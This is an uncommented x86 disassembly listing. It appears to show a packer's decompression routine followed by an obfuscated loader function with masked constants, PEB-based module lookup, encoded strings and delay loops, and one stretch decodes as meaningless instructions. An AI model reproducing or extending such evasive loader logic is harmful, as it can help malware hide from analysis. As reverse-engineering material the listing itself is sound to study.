  425e4c:	shl    eax,cl
  425e4e:	not    eax
  425e50:	push   eax
  425e51:	add    cl,dl
  425e53:	mov    edi,esi
  425e55:	sub    esp,0xc
  425e58:	sub    eax,eax
  425e5a:	inc    eax
  425e5b:	push   eax
  425e5c:	push   eax
  425e5d:	push   eax
  425e5e:	push   eax
  425e5f:	push   eax
  425e60:	push   edi
  425e61:	sub    esi,esi
  425e63:	push   esi
  425e64:	or     ebx,0xffffffff
  425e67:	mov    eax,0x300
  425e6c:	shl    eax,cl
  425e6e:	lea    ecx,[eax+0x736]
  425e74:	mov    eax,0x4000400
  425e79:	shr    ecx,1
  425e7b:	rep stos DWORD PTR es:[edi],eax
  425e7d:	push   0x5
  425e7f:	pop    ecx
  425e80:	call   0x42616b
  425e85:	loop   0x425e80
  425e87:	lea    esi,[esi]
  425e89:	lea    edi,[edi]
  425e8b:	mov    edi,DWORD PTR [ebp-0x4]
  425e8e:	mov    eax,DWORD PTR [ebp-0x10]
  425e91:	sub    edi,DWORD PTR [ebp+0x24]
  425e94:	and    eax,edi
  425e96:	mov    DWORD PTR [ebp-0x18],eax
  425e99:	mov    al,0x0
  425e9b:	call   0x426183
  425ea0:	jne    0x425f3b
  425ea6:	mov    cl,BYTE PTR [ebp-0xc]
  425ea9:	and    edi,DWORD PTR [ebp-0x14]
  425eac:	shl    edi,cl
  425eae:	sub    cl,0x8
  425eb1:	neg    cl
  425eb3:	shr    esi,cl
  425eb5:	pop    eax
  425eb6:	add    edi,esi
  425eb8:	pop    esi
  425eb9:	lea    edi,[edi+edi*2]
  425ebc:	shl    edi,0x8
  425ebf:	cmp    al,0x7
  425ec1:	pop    edx
  425ec2:	lea    ecx,[esi+edi*2+0xe6c]
  425ec9:	push   ecx
  425eca:	push   esi
  425ecb:	mov    esi,0x100
  425ed0:	push   eax
  425ed1:	mov    al,0x1
  425ed3:	jb     0x425f09
  425ed5:	mov    edi,DWORD PTR [ebp-0x4]
  425ed8:	sub    edi,DWORD PTR [ebp-0x24]
  425edb:	movzx  edi,BYTE PTR [edi]
  425ede:	mov    ebp,DWORD PTR [ebp-0x34]
  425ee1:	shl    edi,1
  425ee3:	mov    ecx,esi
  425ee5:	and    esi,edi
  425ee7:	add    ecx,esi
  425ee9:	lea    ebp,[ebp+ecx*2+0x0]
  425eed:	call   0x4261a2
  425ef2:	mov    ecx,eax
  425ef4:	shr    esi,0x8
  425ef7:	and    ecx,0x1
  425efa:	cmp    esi,ecx
  425efc:	mov    esi,0x100
  425f01:	jne    0x425f11
  425f03:	cmp    eax,esi
  425f05:	jb     0x425ede
  425f07:	jmp    0x425f1d
  425f09:	mov    ebp,DWORD PTR [ebp-0x34]
  425f0c:	call   0x4261a2
  425f11:	inc    eax
  425f12:	inc    esi
  425f13:	sub    eax,0x1
  425f16:	sub    esi,0x1
  425f19:	cmp    eax,esi
  425f1b:	jb     0x425f09
  425f1d:	pop    edx
  425f1e:	inc    edx
  425f1f:	cmp    edx,0x5
  425f22:	dec    edx
  425f23:	mov    ecx,edx
  425f25:	jb     0x425f36
  425f27:	inc    edx
  425f28:	cmp    edx,0xb
  425f2b:	dec    edx
  425f2c:	mov    cl,0x4
  425f2e:	dec    cl
  425f30:	jb     0x425f36
  425f32:	mov    cl,0x7
  425f34:	dec    cl
  425f36:	sub    edx,ecx
  425f38:	push   edx
  425f39:	jmp    0x425f8a
  425f3b:	mov    al,0xc1
  425f3d:	dec    al
  425f3f:	call   0x426193
  425f44:	jne    0x425f5a
  425f46:	pop    eax
  425f47:	pop    edi
  425f48:	pop    edx
  425f49:	pop    ecx
  425f4a:	pop    edx
  425f4b:	pop    ecx
  425f4c:	push   DWORD PTR [esp]
  425f4f:	push   ecx
  425f50:	push   edx
  425f51:	mov    edx,0x664
  425f56:	mov    cl,0x0
  425f58:	jmp    0x425fcd
  425f5a:	mov    al,0xcd
  425f5c:	dec    al
  425f5e:	call   0x426193
  425f63:	jne    0x425f93
  425f65:	mov    al,0xf1
  425f67:	dec    al
  425f69:	call   0x426183
  425f6e:	jne    0x425fc3
  425f70:	pop    eax
  425f71:	cmp    al,0x7
  425f73:	mov    al,0x9
  425f75:	jb     0x425f79
  425f77:	mov    al,0xb
  425f79:	push   eax
  425f7a:	mov    esi,DWORD PTR [ebp-0x4]
  425f7d:	sub    esi,DWORD PTR [ebp-0x24]
  425f80:	cmp    esi,DWORD PTR [ebp+0x24]
  425f83:	jb     0x42615a
  425f89:	lods   al,BYTE PTR ds:[esi]
  425f8a:	mov    edi,DWORD PTR [ebp-0x4]
  425f8d:	stos   BYTE PTR es:[edi],al
  425f8e:	jmp    0x426121
  425f93:	mov    al,0xd8
  425f95:	call   0x426193
  425f9a:	mov    esi,DWORD PTR [ebp-0x28]
  425f9d:	je     0x425fba
  425f9f:	mov    al,0xe4
  425fa1:	call   0x426193
  425fa6:	mov    esi,DWORD PTR [ebp-0x2c]
  425fa9:	je     0x425fb4
  425fab:	mov    esi,DWORD PTR [ebp-0x30]
  425fae:	mov    ecx,DWORD PTR [ebp-0x2c]
  425fb1:	mov    DWORD PTR [ebp-0x30],ecx
  425fb4:	mov    ecx,DWORD PTR [ebp-0x28]
  425fb7:	mov    DWORD PTR [ebp-0x2c],ecx
  425fba:	mov    ecx,DWORD PTR [ebp-0x24]
  425fbd:	mov    DWORD PTR [ebp-0x28],ecx
  425fc0:	mov    DWORD PTR [ebp-0x24],esi
  425fc3:	pop    eax
  425fc4:	pop    edi
  425fc5:	pop    ecx
  425fc6:	mov    edx,0xa68
  425fcb:	mov    cl,0x8
  425fcd:	add    edx,edi
  425fcf:	push   edx
  425fd0:	push   edi
  425fd1:	cmp    al,0x7
  425fd3:	mov    al,cl
  425fd5:	jb     0x425fd9
  425fd7:	add    al,0x3
  425fd9:	push   eax
  425fda:	mov    ebp,DWORD PTR [ebp-0x34]
  425fdd:	call   0x4261a0
  425fe2:	jne    0x425ff8
  425fe4:	mov    eax,DWORD PTR [ebp-0x18]
  425fe7:	mov    edi,DWORD PTR [ebp-0x34]
  425fea:	shl    eax,0x3
  425fed:	sub    ecx,ecx
  425fef:	push   0x8
  425ff1:	pop    esi
  425ff2:	lea    edi,[edi+eax*2+0x4]
  425ff6:	jmp    0x42602d
  425ff8:	mov    ebp,DWORD PTR [ebp-0x34]
  425ffb:	add    ebp,0x2
  425ffe:	call   0x4261a0
  426003:	jne    0x42601d
  426005:	mov    eax,DWORD PTR [ebp-0x18]
  426008:	mov    edi,DWORD PTR [ebp-0x34]
  42600b:	shl    eax,0x3
  42600e:	push   0x8
  426010:	pop    ecx
  426011:	push   0x8
  426013:	pop    esi
  426014:	lea    edi,[edi+eax*2+0x104]
  42601b:	jmp    0x42602d
  42601d:	mov    edi,0x204
  426022:	add    edi,DWORD PTR [ebp-0x34]
  426025:	push   0x10
  426027:	pop    ecx
  426028:	mov    esi,0x100
  42602d:	mov    DWORD PTR [ebp-0x1c],ecx
  426030:	sub    eax,eax
  426032:	inc    eax
  426033:	mov    ebp,edi
  426035:	call   0x4261a2
  42603a:	mov    ecx,eax
  42603c:	sub    ecx,esi
  42603e:	jb     0x426033
  426040:	add    DWORD PTR [ebp-0x1c],ecx
  426043:	cmp    DWORD PTR [ebp-0x3c],0x4
  426047:	jae    0x4260fd
  42604d:	add    DWORD PTR [ebp-0x3c],0x7
  426051:	mov    ecx,DWORD PTR [ebp-0x1c]
  426054:	cmp    ecx,0x4
  426057:	jb     0x42605c
  426059:	push   0x3
  42605b:	pop    ecx
  42605c:	mov    edi,DWORD PTR [ebp-0x38]
  42605f:	shl    ecx,0x6
  426062:	sub    eax,eax
  426064:	inc    eax
  426065:	push   0x40
  426067:	pop    esi
  426068:	lea    edi,[edi+ecx*2+0x360]
  42606f:	mov    ebp,edi
  426071:	call   0x4261a2
  426076:	mov    ecx,eax
  426078:	sub    ecx,esi
  42607a:	jb     0x42606f
  42607c:	mov    DWORD PTR [ebp-0x18],ecx
  42607f:	mov    DWORD PTR [ebp-0x24],ecx
  426082:	cmp    ecx,0x4
  426085:	jb     0x4260fa
  426087:	mov    esi,ecx
  426089:	and    DWORD PTR [ebp-0x24],0x1
  42608d:	shr    esi,1
  42608f:	or     DWORD PTR [ebp-0x24],0x2
  426093:	dec    esi
  426094:	cmp    ecx,0xe
  426097:	jae    0x4260b2
  426099:	mov    eax,0x2af
  42609e:	sub    eax,ecx
  4260a0:	mov    ecx,esi
  4260a2:	shl    BYTE PTR [ebp-0x24],cl
  4260a5:	add    eax,DWORD PTR [ebp-0x24]
  4260a8:	shl    eax,1
  4260aa:	add    eax,DWORD PTR [ebp-0x38]
  4260ad:	mov    DWORD PTR [ebp-0x34],eax
  4260b0:	jmp    0x4260df
  4260b2:	sub    esi,0x4
  4260b5:	call   0x42615f
  4260ba:	shr    ebx,1
  4260bc:	shl    DWORD PTR [ebp-0x24],1
  4260bf:	cmp    DWORD PTR [ebp-0x20],ebx
  4260c2:	jb     0x4260ca
  4260c4:	inc    DWORD PTR [ebp-0x24]
  4260c7:	sub    DWORD PTR [ebp-0x20],ebx
  4260ca:	dec    esi
  4260cb:	jne    0x4260b5
  4260cd:	mov    eax,0x644
  4260d2:	add    eax,DWORD PTR [ebp-0x38]
  4260d5:	mov    DWORD PTR [ebp-0x34],eax
  4260d8:	shl    DWORD PTR [ebp-0x24],0x4
  4260dc:	push   0x4
  4260de:	pop    esi
  4260df:	sub    edi,edi
  4260e1:	inc    edi
  4260e2:	mov    eax,edi
  4260e4:	mov    ebp,DWORD PTR [ebp-0x34]
  4260e7:	call   0x4261a2
  4260ec:	test   al,0x1
  4260ee:	je     0x4260f3
  4260f0:	or     DWORD PTR [ebp-0x24],edi
  4260f3:	shl    edi,1
  4260f5:	dec    esi
  4260f6:	jne    0x4260e4
  4260f8:	jmp    0x4260fa
  4260fa:	inc    DWORD PTR [ebp-0x24]
  4260fd:	mov    ecx,DWORD PTR [ebp-0x1c]
  426100:	add    ecx,0x2
  426103:	mov    edi,DWORD PTR [ebp-0x4]
  426106:	mov    eax,edi
  426108:	sub    eax,DWORD PTR [ebp+0x24]
  42610b:	cmp    DWORD PTR [ebp-0x24],eax
  42610e:	ja     0x42615a
  426110:	mov    esi,edi
  426112:	sub    esi,DWORD PTR [ebp-0x24]
  426115:	mov    edx,DWORD PTR [ebp+0x28]
  426118:	lods   al,BYTE PTR ds:[esi]
  426119:	stos   BYTE PTR es:[edi],al
  42611a:	cmp    edi,edx
  42611c:	jae    0x426121
  42611e:	dec    ecx
  42611f:	jne    0x426118
  426121:	mov    DWORD PTR [ebp-0x4],edi
  426124:	movzx  esi,al
  426127:	cmp    edi,DWORD PTR [ebp+0x28]
  42612a:	jb     0x425e8b
  426130:	call   0x42615f
  426135:	sub    eax,eax
  426137:	lea    ebp,[esp+0x3c]
  42613b:	mov    edx,DWORD PTR [ebp+0x20]
  42613e:	mov    esi,DWORD PTR [ebp-0x8]
  426141:	sub    esi,DWORD PTR [ebp+0x18]
  426144:	mov    DWORD PTR [edx],esi
  426146:	mov    dh,0xdd
  426148:	cmp    BYTE PTR [esi+0x7d347b7d],dh
  42614e:	sbb    BYTE PTR [esi+0x1f5af70],ch
  426154:	add    eax,0x188f893
  426159:	jmp    0x37cbec92
  42615e:	jmp    0x4260ee
  426160:	ja     0x4260ea
  426162:	mov    BYTE PTR [eax-0x6873ae74],cl
  426168:	(bad)  
  426169:	pop    ss
  42616a:	test   al,0xe1
  42616c:	mov    dh,0x5d
  42616e:	imul   esi,DWORD PTR [ebp+ebx*2-0x8],0x55
  426173:	sbb    esi,DWORD PTR [esi+0xb8f0b9d]
  426179:	test   al,0x3a
  42617b:	scas   al,BYTE PTR es:[edi]
  42617c:	popf   
  42617d:	or     ebp,DWORD PTR [esi-0x68fe94a3]
  426183:	mov    dh,0xbd
  426185:	fwait
  426186:	les    esp,FWORD PTR [edx-0x75]
  426189:	(bad)  
  42618a:	sets   BYTE PTR [ebp+ebx*4+0x378f942b]
  426192:	mov    al,ds:0x948b62c4
  426197:	popf   
  426198:	fwait
  426199:	mov    dh,0x3d
  42619b:	stos   DWORD PTR es:[edi],eax
  42619c:	mov    esi,0x34889d39
  4261a1:	mov    edi,DWORD PTR [esi-0x717762c7]
  4261a7:	ja     0x426131
  4261a9:	mov    BYTE PTR [eax-0x4907aa74],cl
  4261af:	mov    ecx,0x198f6818
  4261b4:	sbb    BYTE PTR [eax],cl
  4261b6:	test   al,0x74
  4261b8:	mov    ecx,0xfa55f918
  4261bd:	mov    dl,0xcc
  4261bf:	xchg   DWORD PTR [ecx+0x178f6818],ebx
  4261c5:	test   al,0x88
  4261c7:	push   esp
  4261c8:	and    al,0x20
  4261ca:	mov    ecx,ebx
  4261cc:	movzx  edx,WORD PTR [ebp+0x0]
  4261d0:	shr    ecx,0xb
  4261d3:	imul   ecx,edx
  4261d6:	cmp    DWORD PTR [esp+0x20],ecx
  4261da:	jae    0x4261f3
  4261dc:	mov    ebx,ecx
  4261de:	mov    ecx,0x800
  4261e3:	sub    ecx,edx
  4261e5:	shr    ecx,0x5
  4261e8:	add    WORD PTR [ebp+0x0],cx
  4261ec:	add    eax,eax
  4261ee:	lea    ebp,[esp+0x40]
  4261f2:	ret    
  4261f3:	shr    edx,0x5
  4261f6:	sub    DWORD PTR [esp+0x20],ecx
  4261fa:	sub    ebx,ecx
  4261fc:	sub    WORD PTR [ebp+0x0],dx
  426200:	add    eax,eax
  426202:	add    eax,0x1
  426205:	lea    ebp,[esp+0x40]
  426209:	ret    
  42620a:	push   ebp
  42620b:	mov    ebp,esp
  42620d:	sub    esp,0x12c
  426213:	push   ebx
  426214:	push   esi
  426215:	push   edi
  426216:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  42621d:	mov    DWORD PTR [ebp-0x18],0xf89c85a2
  426224:	mov    eax,DWORD PTR [ebp+0x8]
  426227:	mov    DWORD PTR [ebp+0x8],eax
  42622a:	mov    ecx,DWORD PTR [ebp-0x10]
  42622d:	mov    ebx,0x75108ae
  426232:	xor    ecx,ebx
  426234:	mov    eax,0x3272f5
  426239:	add    ecx,eax
  42623b:	mov    DWORD PTR [ebp-0x24],ecx
  42623e:	mov    ecx,DWORD PTR [ebp-0x10]
  426241:	xor    ecx,ebx
  426243:	add    ecx,eax
  426245:	mov    DWORD PTR [ebp-0x40],ecx
  426248:	mov    ecx,DWORD PTR [ebp-0x10]
  42624b:	xor    ecx,ebx
  42624d:	add    ecx,eax
  42624f:	mov    DWORD PTR [ebp-0x3c],ecx
  426252:	mov    ecx,DWORD PTR [ebp-0x10]
  426255:	xor    ecx,ebx
  426257:	add    ecx,eax
  426259:	mov    DWORD PTR [ebp-0xd8],ecx
  42625f:	mov    DWORD PTR [ebp-0x50],0xf89f05a5
  426266:	mov    DWORD PTR [ebp-0x3c],0xf89cb5a5
  42626d:	mov    DWORD PTR [ebp-0x54],0xf89c85a1
  426274:	push   0x25
  426276:	pop    ecx
  426277:	mov    DWORD PTR [ebp-0x30],ecx
  42627a:	mov    DWORD PTR [ebp-0x30],ecx
  42627d:	push   0x65
  42627f:	pop    ecx
  426280:	mov    DWORD PTR [ebp-0x30],ecx
  426283:	mov    DWORD PTR [ebp-0x30],ecx
  426286:	mov    DWORD PTR [ebp-0x30],0x4d
  42628d:	mov    DWORD PTR [ebp-0x30],0x43
  426294:	mov    ecx,DWORD PTR [ebp-0x10]
  426297:	xor    ecx,ebx
  426299:	add    ecx,eax
  42629b:	mov    DWORD PTR [ebp-0x30],ecx
  42629e:	mov    ecx,DWORD PTR [ebp-0x10]
  4262a1:	xor    ecx,ebx
  4262a3:	add    ecx,eax
  4262a5:	mov    DWORD PTR [ebp-0x30],ecx
  4262a8:	mov    DWORD PTR [ebp-0x28],0x258
  4262af:	mov    DWORD PTR [ebp-0x34],0x36
  4262b6:	mov    DWORD PTR [ebp-0x14],0x7a
  4262bd:	lea    edi,[ebp-0x10c]
  4262c3:	lea    esi,[ebp-0x12c]
  4262c9:	call   0x426f89
  4262ce:	dec    DWORD PTR [ebp-0x14]
  4262d1:	jne    0x4262bd
  4262d3:	dec    DWORD PTR [ebp-0x34]
  4262d6:	jne    0x4262b6
  4262d8:	dec    DWORD PTR [ebp-0x28]
  4262db:	jne    0x4262af
  4262dd:	mov    DWORD PTR [ebp-0x28],0x400e
  4262e4:	mov    eax,DWORD PTR [ebp-0x10]
  4262e7:	xor    eax,ebx
  4262e9:	mov    esi,0x3272f5
  4262ee:	add    eax,esi
  4262f0:	mov    DWORD PTR [ebp-0x1c],eax
  4262f3:	mov    eax,DWORD PTR [ebp-0x10]
  4262f6:	and    DWORD PTR [ebp-0x94],0x0
  4262fd:	xor    eax,ebx
  4262ff:	add    eax,esi
  426301:	mov    DWORD PTR [ebp-0x38],eax
  426304:	mov    eax,fs:0x18
  42630a:	mov    DWORD PTR [ebp-0x94],eax
  426310:	mov    eax,DWORD PTR [eax+0x30]
  426313:	mov    DWORD PTR [ebp-0xcc],eax
  426319:	mov    eax,DWORD PTR [eax+0xc]
  42631c:	mov    DWORD PTR [ebp-0xc0],eax
  426322:	mov    eax,DWORD PTR [ebp+0x8]
  426325:	lea    ecx,[ebp-0x94]
  42632b:	mov    DWORD PTR [eax+0x1a0],ecx
  426331:	mov    eax,DWORD PTR [ebp+0x8]
  426334:	lea    ecx,[ebp-0xcc]
  42633a:	mov    DWORD PTR [eax+0x1a4],ecx
  426340:	mov    eax,DWORD PTR [ebp+0x8]
  426343:	push   DWORD PTR [ebp+0x8]
  426346:	lea    ecx,[ebp-0xc0]
  42634c:	mov    DWORD PTR [eax+0x1a8],ecx
  426352:	call   0x42874a
  426357:	mov    ecx,DWORD PTR [ebp-0x10]
  42635a:	xor    ecx,ebx
  42635c:	add    ecx,esi
  42635e:	cmp    ecx,eax
  426360:	je     0x4266e3
  426366:	mov    eax,DWORD PTR [ebp+0x8]
  426369:	mov    eax,DWORD PTR [eax+0x194]
  42636f:	mov    ecx,DWORD PTR [eax]
  426371:	mov    eax,DWORD PTR [ebp+0x8]
  426374:	mov    eax,DWORD PTR [eax+0x194]
  42637a:	mov    eax,DWORD PTR [eax]
  42637c:	add    eax,DWORD PTR [ecx+0x3c]
  42637f:	mov    ecx,DWORD PTR [ebp+0x8]
  426382:	mov    ecx,DWORD PTR [ecx+0x1e0]
  426388:	lea    edx,[ebp-0xec]
  42638e:	push   edx
  42638f:	mov    edx,DWORD PTR [ebp+0x8]
  426392:	mov    edx,DWORD PTR [edx+0x18c]
  426398:	mov    edx,DWORD PTR [edx]
  42639a:	add    edx,DWORD PTR [eax+0x88]
  4263a0:	push   0x4
  4263a2:	push   DWORD PTR [eax+0x8c]
  4263a8:	push   edx
  4263a9:	call   DWORD PTR [ecx+0x1c]
  4263ac:	push   DWORD PTR [ebp+0x8]
  4263af:	xor    eax,eax
  4263b1:	mov    DWORD PTR [ebp-0xa8],0x1b3e0e38
  4263bb:	mov    DWORD PTR [ebp-0xa4],0x12371120
  4263c5:	mov    DWORD PTR [ebp-0xa0],0x40111c0a
  4263cf:	mov    BYTE PTR [ebp-0x9c],0x83
  4263d6:	lea    edi,[ebp-0x9b]
  4263dc:	stos   DWORD PTR es:[edi],eax
  4263dd:	stos   WORD PTR es:[edi],ax
  4263df:	stos   BYTE PTR es:[edi],al
  4263e0:	xor    eax,eax
  4263e2:	mov    DWORD PTR [ebp-0xbc],0x1b3e0e38
  4263ec:	mov    DWORD PTR [ebp-0xb8],0x12371120
  4263f6:	mov    DWORD PTR [ebp-0xb4],0x2a111c0a
  426400:	mov    BYTE PTR [ebp-0xb0],0x83
  426407:	lea    edi,[ebp-0xaf]
  42640d:	stos   DWORD PTR es:[edi],eax
  42640e:	stos   WORD PTR es:[edi],ax
  426410:	stos   BYTE PTR es:[edi],al
  426411:	mov    edi,DWORD PTR [ebp+0x8]
  426414:	mov    eax,DWORD PTR [ebp+0x8]
  426417:	mov    edx,DWORD PTR [eax+0x1b8]
  42641d:	mov    DWORD PTR [ebp-0x68],0x110f0e17
  426424:	mov    DWORD PTR [ebp-0x64],0x1813141e
  42642b:	mov    WORD PTR [ebp-0x60],0x8340
  426431:	mov    DWORD PTR [ebp-0x90],0x1b3e0e38
  42643b:	mov    DWORD PTR [ebp-0x8c],0x17401120
  426445:	mov    DWORD PTR [ebp-0x88],0x35201b13
  42644f:	mov    DWORD PTR [ebp-0x84],0x111c140c
  426459:	mov    DWORD PTR [ebp-0x80],0x83401e18
  426460:	mov    DWORD PTR [ebp-0x7c],0x1b3e0e38
  426467:	mov    DWORD PTR [ebp-0x78],0x17401120
  42646e:	mov    DWORD PTR [ebp-0x74],0x35201b13
  426475:	mov    DWORD PTR [ebp-0x70],0x111c140c
  42647c:	mov    DWORD PTR [ebp-0x6c],0x832a1e18
  426483:	call   0x428779
  426488:	push   eax
  426489:	mov    eax,DWORD PTR [ebp+0x8]
  42648c:	mov    eax,DWORD PTR [eax+0x1a8]
  426492:	push   DWORD PTR [eax]
  426494:	call   0x42841a
  426499:	test   eax,eax
  42649b:	jne    0x4264ed
  42649d:	mov    eax,DWORD PTR [ebp+0x8]
  4264a0:	mov    eax,DWORD PTR [eax+0x1e0]
  4264a6:	mov    edi,DWORD PTR [ebp+0x8]
  4264a9:	add    eax,0x4
  4264ac:	mov    DWORD PTR [ebp-0x20],eax
  4264af:	mov    eax,DWORD PTR [ebp+0x8]
  4264b2:	mov    edx,DWORD PTR [eax+0x1b8]
  4264b8:	call   0x428779
  4264bd:	push   eax
  4264be:	mov    eax,DWORD PTR [ebp-0x20]
  4264c1:	call   DWORD PTR [eax]
  4264c3:	test   eax,eax
  4264c5:	jne    0x4264ed
  4264c7:	mov    eax,DWORD PTR [ebp+0x8]
  4264ca:	mov    eax,DWORD PTR [eax+0x1e0]
  4264d0:	mov    edi,DWORD PTR [ebp+0x8]
  4264d3:	add    eax,0x10
  4264d6:	mov    DWORD PTR [ebp-0x20],eax
  4264d9:	mov    eax,DWORD PTR [ebp+0x8]
  4264dc:	mov    edx,DWORD PTR [eax+0x1b8]
  4264e2:	call   0x428779
  4264e7:	push   eax
  4264e8:	mov    eax,DWORD PTR [ebp-0x20]
  4264eb:	call   DWORD PTR [eax]
  4264ed:	mov    eax,DWORD PTR [ebp-0x10]
  4264f0:	mov    ecx,DWORD PTR [ebp-0x28]
  4264f3:	xor    eax,ebx
  4264f5:	add    eax,esi
  4264f7:	cmp    eax,ecx
  4264f9:	je     0x4266bc
  4264ff:	mov    eax,DWORD PTR [ebp-0x18]
  426502:	xor    eax,ebx
  426504:	mov    ecx,0xffcd8d0b
  426509:	sub    ecx,eax
  42650b:	add    ecx,DWORD PTR [ebp-0x28]
  42650e:	mov    eax,DWORD PTR [ebp-0x1c]
  426511:	cmp    eax,ecx
  426513:	ja     0x4266bc
  426519:	mov    DWORD PTR [ebp-0x34],0x0
  426520:	push   DWORD PTR [ebp+0x8]
  426523:	mov    edi,DWORD PTR [ebp+0x8]
  426526:	mov    eax,DWORD PTR [ebp+0x8]
  426529:	mov    edx,DWORD PTR [eax+0x1b4]
  42652f:	call   0x428779
  426534:	push   eax
  426535:	mov    eax,DWORD PTR [ebp+0x8]
  426538:	mov    eax,DWORD PTR [eax+0x1a8]
  42653e:	push   DWORD PTR [eax]
  426540:	call   0x42841a
  426545:	mov    ecx,DWORD PTR [ebp+0x8]
  426548:	mov    ecx,DWORD PTR [ecx+0x19c]
  42654e:	mov    DWORD PTR [ecx],eax
  426550:	mov    eax,DWORD PTR [ebp+0x8]
  426553:	mov    edi,DWORD PTR [eax+0x1e0]
  426559:	mov    esi,DWORD PTR [ebp+0x8]
  42655c:	xor    eax,eax
  42655e:	lea    edx,[ebp-0x7c]
  426561:	call   0x4287af
  426566:	push   eax
  426567:	mov    eax,DWORD PTR [ebp+0x8]
  42656a:	mov    eax,DWORD PTR [eax+0x19c]
  426570:	push   DWORD PTR [eax]
  426572:	call   DWORD PTR [edi+0x8]
  426575:	mov    DWORD PTR [ebp-0x20],eax
  426578:	mov    eax,DWORD PTR [ebp+0x8]
  42657b:	mov    edi,DWORD PTR [eax+0x1e0]
  426581:	mov    esi,DWORD PTR [ebp+0x8]
  426584:	xor    eax,eax
  426586:	lea    edx,[ebp-0x90]
  42658c:	call   0x4287af
  426591:	push   eax
  426592:	mov    eax,DWORD PTR [ebp+0x8]
  426595:	mov    eax,DWORD PTR [eax+0x19c]
  42659b:	push   DWORD PTR [eax]
  42659d:	call   DWORD PTR [edi+0x8]
  4265a0:	mov    eax,DWORD PTR [ebp+0x8]
  4265a3:	mov    edi,DWORD PTR [eax+0x1e0]
  4265a9:	mov    esi,DWORD PTR [ebp+0x8]
  4265ac:	xor    eax,eax
  4265ae:	lea    edx,[ebp-0xa8]
  4265b4:	call   0x4287af
  4265b9:	push   eax
  4265ba:	mov    eax,DWORD PTR [ebp+0x8]
  4265bd:	mov    eax,DWORD PTR [eax+0x19c]
  4265c3:	push   DWORD PTR [eax]
  4265c5:	call   DWORD PTR [edi+0x8]
  4265c8:	and    DWORD PTR [ebp-0x8],0x0
  4265cc:	mov    DWORD PTR [ebp-0x48],eax
  4265cf:	mov    eax,DWORD PTR [ebp-0x8]
  4265d2:	and    eax,0x7
  4265d5:	add    eax,0x31
  4265d8:	push   eax
  4265d9:	call   DWORD PTR [ebp-0x20]
  4265dc:	test   eax,eax
  4265de:	je     0x426622
  4265e0:	mov    eax,DWORD PTR [ebp-0x8]
  4265e3:	push   0x19
  4265e5:	xor    edx,edx
  4265e7:	pop    ecx
  4265e8:	div    ecx
  4265ea:	add    dl,0x41
  4265ed:	movzx  eax,dl
  4265f0:	push   eax
  4265f1:	call   DWORD PTR [ebp-0x48]
  4265f4:	test   eax,eax
  4265f6:	jne    0x426622
  4265f8:	mov    eax,DWORD PTR [ebp+0x8]
  4265fb:	mov    edi,DWORD PTR [eax+0x1e0]
  426601:	mov    esi,DWORD PTR [ebp+0x8]
  426604:	xor    eax,eax
  426606:	lea    edx,[ebp-0x68]
  426609:	call   0x4287af
  42660e:	push   eax
  42660f:	mov    eax,DWORD PTR [ebp+0x8]
  426612:	mov    eax,DWORD PTR [eax+0x198]
  426618:	push   DWORD PTR [eax]
  42661a:	call   DWORD PTR [edi+0x8]
  42661d:	mov    DWORD PTR [ebp-0x14],eax
  426620:	jmp    0x426626
  426622:	and    DWORD PTR [ebp-0x14],0x0
  426626:	inc    DWORD PTR [ebp-0x8]
  426629:	cmp    DWORD PTR [ebp-0x8],0x10
  42662d:	jb     0x4265cf
  42662f:	mov    eax,DWORD PTR [ebp-0x18]
  426632:	mov    esi,DWORD PTR [ebp+0x8]
  426635:	xor    eax,ebx
  426637:	mov    edi,0x3272f5
  42663c:	add    eax,edi
  42663e:	lea    edx,[ebp-0x10c]
  426644:	call   0x4287af
  426649:	push   eax
  42664a:	mov    eax,DWORD PTR [ebp-0x10]
  42664d:	mov    esi,DWORD PTR [ebp+0x8]
  426650:	xor    eax,ebx
  426652:	add    eax,edi
  426654:	lea    edx,[ebp-0x12c]
  42665a:	call   0x4287af
  42665f:	push   eax
  426660:	call   DWORD PTR [ebp-0x14]
  426663:	mov    ecx,DWORD PTR [ebp-0x10]
  426666:	xor    ecx,ebx
  426668:	add    ecx,edi
  42666a:	cmp    ecx,eax
  42666c:	jne    0x426675
  42666e:	mov    DWORD PTR [ebp-0x34],0x1
  426675:	mov    eax,DWORD PTR [ebp-0x18]
  426678:	mov    ecx,DWORD PTR [ebp-0x1c]
  42667b:	xor    eax,ebx
  42667d:	lea    eax,[eax+ecx*1+0x3272f5]
  426684:	mov    DWORD PTR [ebp-0x1c],eax
  426687:	mov    eax,DWORD PTR [ebp-0x34]
  42668a:	test   eax,eax
  42668c:	je     0x4266a0
  42668e:	mov    eax,DWORD PTR [ebp-0x18]
  426691:	mov    ecx,DWORD PTR [ebp-0x38]
  426694:	xor    eax,ebx
  426696:	lea    eax,[eax+ecx*1+0x3272f5]
  42669d:	mov    DWORD PTR [ebp-0x38],eax
  4266a0:	mov    eax,DWORD PTR [ebp-0x18]
  4266a3:	xor    eax,ebx
  4266a5:	mov    ecx,0xffcd8d0b
  4266aa:	sub    ecx,eax
  4266ac:	add    ecx,DWORD PTR [ebp-0x28]
  4266af:	mov    eax,DWORD PTR [ebp-0x1c]
  4266b2:	cmp    eax,ecx
  4266b4:	jbe    0x426519
  4266ba:	mov    esi,edi
  4266bc:	mov    eax,DWORD PTR [ebp-0x38]
  4266bf:	mov    ecx,DWORD PTR [ebp-0x1c]
  4266c2:	cmp    ecx,eax
  4266c4:	jne    0x4266d7
  4266c6:	push   DWORD PTR [ebp+0x8]
  4266c9:	lea    eax,[ebp-0x40]
  4266cc:	push   eax
  4266cd:	call   0x42921e
  4266d2:	mov    DWORD PTR [ebp-0x24],eax
  4266d5:	jmp    0x4266e3
  4266d7:	mov    eax,DWORD PTR [ebp-0x24]
  4266da:	mov    ecx,DWORD PTR [ebp-0x18]
  4266dd:	xor    ecx,ebx
  4266df:	add    ecx,esi
  4266e1:	xor    DWORD PTR [eax],ecx
  4266e3:	mov    eax,DWORD PTR [ebp-0x10]
  4266e6:	mov    ecx,DWORD PTR [ebp-0x24]
  4266e9:	xor    eax,ebx
  4266eb:	add    eax,esi
  4266ed:	cmp    eax,ecx
  4266ef:	je     0x426e67
  4266f5:	mov    eax,DWORD PTR [ebp-0x10]
  4266f8:	mov    ecx,DWORD PTR [ebp-0x40]
  4266fb:	xor    eax,ebx
  4266fd:	add    eax,esi
  4266ff:	cmp    eax,ecx
  426701:	je     0x426e67
  426707:	mov    eax,DWORD PTR [ebp-0x10]
  42670a:	xor    eax,ebx
  42670c:	add    eax,esi
  42670e:	jmp    0x42672c
  426710:	mov    edi,DWORD PTR [ebp-0x24]
  426713:	mov    cl,al
